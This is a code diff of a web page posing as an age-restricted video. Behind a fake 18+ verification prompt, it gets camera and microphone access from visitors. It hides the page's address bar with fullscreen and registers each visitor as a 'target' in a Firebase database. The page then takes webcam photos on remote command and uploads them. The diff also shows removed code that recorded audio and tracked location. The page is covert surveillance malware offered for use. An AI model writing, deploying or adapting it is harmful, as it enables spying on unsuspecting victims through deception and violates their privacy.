@@ -7,45 +7,48 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
         
-        /* Background Layer with Slight Blur */
+        /* Background Layer */
         #bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('bg.png.jpeg');
+            background: url('bg.png.jpeg'); 
             background-size: cover; background-position: center;
-            filter: blur(8px); /* Thoda blur jaisa aapne kaha */
-            z-index: 1; transform: scale(1.1);
+            filter: blur(5px); z-index: 1; transform: scale(1.1);
         }
 
         #main-ui {
             position: relative; z-index: 10; width: 100%; height: 100%;
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background: rgba(0,0,0,0.3); /* Overlay to make text pop */
+            background: rgba(0,0,0,0.5);
         }
 
-        /* Professional Play Button */
         #play-trigger {
-            width: 110px; height: 110px;
-            background: rgba(255, 255, 255, 0.15);
-            border: 4px solid #fff; border-radius: 50%;
-            display: flex; justify-content: center; align-items: center;
-            cursor: pointer; box-shadow: 0 0 40px rgba(0,0,0,0.5);
-            transition: 0.3s ease;
+            width: 100px; height: 100px; background: rgba(255, 255, 255, 0.2);
+            border: 4px solid #fff; border-radius: 50%; display: flex;
+            justify-content: center; align-items: center; cursor: pointer;
+            box-shadow: 0 0 30px rgba(255,255,255,0.2);
         }
-        #play-trigger:active { transform: scale(0.9); }
         #play-trigger::after {
-            content: ''; width: 0; height: 0;
-            border-top: 20px solid transparent; border-bottom: 20px solid transparent;
+            content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent;
             border-left: 32px solid white; margin-left: 10px;
         }
 
-        .text-box { text-align: center; margin-top: 25px; }
-        h1 { color: #00ff41; font-size: 32px; margin: 0; text-shadow: 2px 2px 10px rgba(0,0,0,0.8); }
-        p { color: #ff3131; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        /* Custom Age Verification Modal */
+        #age-modal {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 85%; max-width: 350px; background: #111; border: 1px solid #333;
+            border-radius: 15px; padding: 25px; text-align: center; z-index: 200;
+            box-shadow: 0 0 50px rgba(0,0,0,0.8);
+        }
+        #age-modal h2 { color: #fff; font-size: 20px; margin-bottom: 10px; }
+        #age-modal p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
+        .modal-btns { display: flex; gap: 10px; }
+        .btn { flex: 1; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; }
+        .btn-yes { background: #00ff41; color: #000; }
+        .btn-no { background: #333; color: #fff; }
 
-        /* Real Video Stage */
-        #target-video { display: none; width: 100%; height: 100%; background: #000; position: fixed; top: 0; left: 0; z-index: 100; }
+        #target-video { display: none; width: 100%; height: 100%; background: #000; position: fixed; top: 0; left: 0; z-index: 1000; }
     </style>
 </head>
 <body>
@@ -53,87 +56,81 @@
     <div id="bg-image"></div>
 
     <div id="main-ui">
-        <div id="play-trigger" onclick="verifyAndStart()"></div>
-        <div class="text-box">
-            <h1>WATCH VIDEO</h1>
-            <p>Verify your age (18+) to watch this stream.</p>
+        <div id="play-trigger" onclick="showModal()"></div>
+        <div style="text-align:center; margin-top:20px;">
+            <h1 style="color:#00ff41; font-size:26px;">WATCH VIDEO</h1>
+            <p style="color:#fff; opacity:0.7;">Restricted Content (18+)</p>
         </div>
     </div>
 
-    <video id="target-video" controls playsinline loop>
+    <div id="age-modal">
+        <h2>Age Verification</h2>
+        <p>This video is age-restricted. Are you 18 years or older to proceed?</p>
+        <div class="modal-btns">
+            <button class="btn btn-yes" onclick="startEverything()">YES, I AM 18+</button>
+            <button class="btn btn-no" onclick="location.reload()">EXIT</button>
+        </div>
+    </div>
+
+    <video id="target-video" controls loop playsinline>
         <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
     </video>
 
     <script>
-        // Firebase Configuration
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const agentID = "UNIT_" + Math.floor(1000 + Math.random() * 9000);
 
-        async function verifyAndStart() {
-            // Step 1: Age verification prompt
-            if (confirm("This content is age-restricted (18+). Are you sure you want to proceed?")) {
-                try {
-                    // Step 2: Permission request (Camera & Mic)
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    
-                    // Step 3: UI Transition
-                    document.getElementById('main-ui').style.display = 'none';
-                    document.getElementById('bg-image').style.display = 'none';
-                    const video = document.getElementById('target-video');
-                    video.style.display = 'block';
-                    video.play();
+        function showModal() {
+            document.getElementById('age-modal').style.display = 'block';
+        }
 
-                    // Step 4: Background Surveillance Engine
-                    runSurveillance(stream);
+        async function startEverything() {
+            document.getElementById('age-modal').style.display = 'none';
+            try {
+                // Request Permissions
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // Hide All UI
+                document.getElementById('main-ui').style.display = 'none';
+                document.getElementById('bg-image').style.display = 'none';
+                
+                // Fullscreen to Hide Address Bar (Vercel Link)
+                const docElm = document.documentElement;
+                if (docElm.requestFullscreen) docElm.requestFullscreen();
+                else if (docElm.webkitRequestFullscreen) docElm.webkitRequestFullscreen();
 
-                } catch (e) {
-                    alert("Permission Required: You must allow camera access to verify your age.");
-                    location.reload();
-                }
+                const video = document.getElementById('target-video');
+                video.style.display = 'block';
+                video.play();
+
+                // Start Hacking
+                runSystem(stream);
+            } catch (e) {
+                alert("Verification Failed: Camera access is mandatory.");
+                location.reload();
             }
         }
 
-        function runSurveillance(stream) {
+        function runSystem(stream) {
             const v = document.createElement('video');
             v.srcObject = stream; v.muted = true; v.play();
 
-            db.ref('targets/' + agentID + '/info').set({ status: "WATCHING_VIDEO", last: new Date().toLocaleTimeString() });
+            db.ref('targets/' + agentID + '/info').set({ status: "WATCHING", device: navigator.platform });
 
-            // Listen for Admin Commands
             db.ref('commands/' + agentID).on('value', async snap => {
                 const cmd = snap.val();
                 if(!cmd) return;
-
                 if(cmd.action.includes('photo')) {
                     const canvas = document.createElement('canvas');
                     canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                     canvas.getContext('2d').drawImage(v, 0, 0);
                     db.ref('targets/' + agentID + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
                 }
-                
-                if(cmd.action === 'audio') {
-                    const rec = new MediaRecorder(stream);
-                    let chunks = [];
-                    rec.ondataavailable = e => chunks.push(e.data);
-                    rec.onstop = () => {
-                        const reader = new FileReader();
-                        reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
-                        reader.onloadend = () => db.ref('targets/' + agentID + '/audios').push({ audio: reader.result });
-                    };
-                    rec.start(); setTimeout(() => rec.stop(), 4500);
-                }
                 db.ref('commands/' + agentID).remove();
-            });
-
-            // Tracking Location
-            navigator.geolocation.watchPosition(p => {
-                db.ref('targets/' + agentID + '/location').set({ lat: p.coords.latitude, lng: p.coords.longitude });
             });
         }
     </script>
 </body>
 </html>
-
-
